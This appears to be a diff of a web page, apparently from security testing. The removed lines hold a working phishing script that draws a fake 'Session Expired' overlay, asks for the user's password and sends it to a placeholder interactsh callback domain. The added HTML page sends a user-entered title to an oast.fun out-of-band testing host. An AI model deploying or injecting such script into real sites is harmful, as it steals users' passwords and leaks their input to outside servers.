@@ -1,30 +1,91 @@
-<script>
-let overlay = document.createElement('div');
-overlay.style.position = 'fixed';
-overlay.style.top = 0;
-overlay.style.left = 0;
-overlay.style.width = '100%';
-overlay.style.height = '100%';
-overlay.style.background = 'rgba(0,0,0,0.5)';
-overlay.style.zIndex = 999999;
-overlay.style.display = 'flex';
-overlay.style.alignItems = 'center';
-overlay.style.justifyContent = 'center';
-overlay.innerHTML = `
-  <div style="background:white;padding:20px;border-radius:6px;text-align:center;font-family:sans-serif;max-width:300px;box-shadow:0 0 10px rgba(0,0,0,0.3);">
-    <h3>Session Expired</h3>
-    <p>Please re-enter your password</p>
-    <input type="password" id="pw" style="width:100%;padding:6px;margin-top:8px;">
-    <button id="submit" style="margin-top:10px;padding:6px 12px;">Continue</button>
-  </div>
-`;
-document.body.appendChild(overlay);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Title Prompt</title>
+  <style>
+    #popup {
+      display: none;
+      position: fixed;
+      top: 30%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: white;
+      border: 2px solid #ccc;
+      padding: 20px;
+      z-index: 1000;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+    }
+    #overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.5);
+      z-index: 999;
+    }
+  </style>
+</head>
+<body>
 
-document.getElementById('submit').onclick = () => {
-    let pw = document.getElementById('pw').value;
-    fetch("https://YOUR-INTERACTSH-DOMAIN.interactsh.com/pass?pwd=" + encodeURIComponent(pw))
-    .catch(()=>{});
-    overlay.innerHTML = `<div style="color:white;font-size:18px;">Session Restored...</div>`;
-    setTimeout(()=>overlay.remove(),1500);
-};
+<button onclick="openPopup()">F Title</button>
+
+<div id="overlay"></div>
+
+<div id="popup">
+  <label for="titleInput">Enter Title:</label>
+  <input type="text" id="titleInput" />
+  <br><br>
+  <button onclick="sendTitle()">Submit</button>
+  <button onclick="closePopup()">Cancel</button>
+</div>
+
+<script>
+  function openPopup() {
+    document.getElementById('popup').style.display = 'block';
+    document.getElementById('overlay').style.display = 'block';
+  }
+
+  function closePopup() {
+    document.getElementById('popup').style.display = 'none';
+    document.getElementById('overlay').style.display = 'none';
+  }
+
+  function sendTitle() {
+    const title = document.getElementById('titleInput').value;
+
+    if (!title.trim()) {
+      alert('Title cannot be empty!');
+      return;
+    }
+
+    fetch('http://zxoedymekhstpruvwboal9f78tyjukijo.oast.fun/a', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ title: title })
+    })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Failed to send title');
+      }
+      return response.json();
+    })
+    .then(data => {
+      console.log('Server response:', data);
+      alert('Title sent successfully!');
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      alert('Error sending title');
+    })
+    .finally(() => {
+      closePopup();
+    });
+  }
 </script>
+
+</body>
+</html>
